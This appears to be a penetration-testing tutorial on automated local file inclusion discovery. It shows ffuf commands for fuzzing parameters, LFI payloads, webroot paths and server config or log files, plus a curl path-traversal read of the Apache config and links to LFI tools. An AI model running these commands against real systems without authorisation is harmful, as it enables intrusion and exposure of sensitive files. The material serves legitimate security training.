# Autometed Scanning

Web applications often have exposed parameters that are not linked to HTML forms, making them less secure. Fuzzing these parameters can reveal vulnerabilities. The `ffuf` tool can be used to fuzz GET parameters effectively.

#### Example of Fuzzing GET Parameters

{% code overflow="wrap" %}
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
{% endcode %}

This command will scan for exposed parameters and help identify potential LFI vulnerabilities.

[Wordlist](https://raw.githubusercontent.com/kafkaesqu3/fuzzing/refs/heads/master/parameters/burp-parameter-names.txt)

***

### 📜 LFI Wordlists

Manual crafting of LFI payloads is reliable, but quick tests using common LFI payloads can save time. A recommended wordlist is **LFI-Jhaddix.txt**, which contains various bypasses and common files.

#### Example of Fuzzing with LFI Wordlist

{% code overflow="wrap" %}
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
{% endcode %}

This command tests the `language` parameter for common LFI payloads.

[Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

***

### 🗂️ Fuzzing Server Files

Identifying server files can aid in LFI exploitation. Key files include the server webroot path, configuration files, and logs.

#### Finding the Server Webroot

To locate the server webroot path, fuzz for the `index.php` file using common webroot paths.

**Example of Fuzzing for Webroot Path**

{% code overflow="wrap" %}
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
{% endcode %}

This command helps identify the correct webroot path.

[Linux Wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/default-web-root-directory-linux.txt)

[Windows Wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

***

### 📁 Server Logs/Configurations

Identifying logs and configuration files is essential for further exploitation. The **LFI-Jhaddix.txt** wordlist can be used to find these paths.

#### Example of Fuzzing for Server Configurations

{% code overflow="wrap" %}
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
{% endcode %}

This command scans for server configuration files, which may contain valuable information.

[Linux Wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

[Windows Wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

#### Reading Configuration Files

To read a specific configuration file, use `curl`:

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

This retrieves the Apache configuration, revealing the webroot and log paths.

***

### 🛠️ LFI Tools

Several tools can automate the LFI exploitation process, such as [**LFISuite**](https://github.com/D35m0nd142/LFISuite), [**LFiFreak**](https://github.com/OsandaMalith/LFiFreak), and [**liffy**](https://github.com/mzfr/liffy). While these tools can save time, they may miss vulnerabilities that manual testing would catch. Most tools are outdated and rely on Python 2, so their long-term viability is questionable.

#### Conclusion

Utilizing both manual techniques and automated tools can enhance the effectiveness of identifying and exploiting LFI vulnerabilities. Always verify findings through manual testing to ensure accuracy.
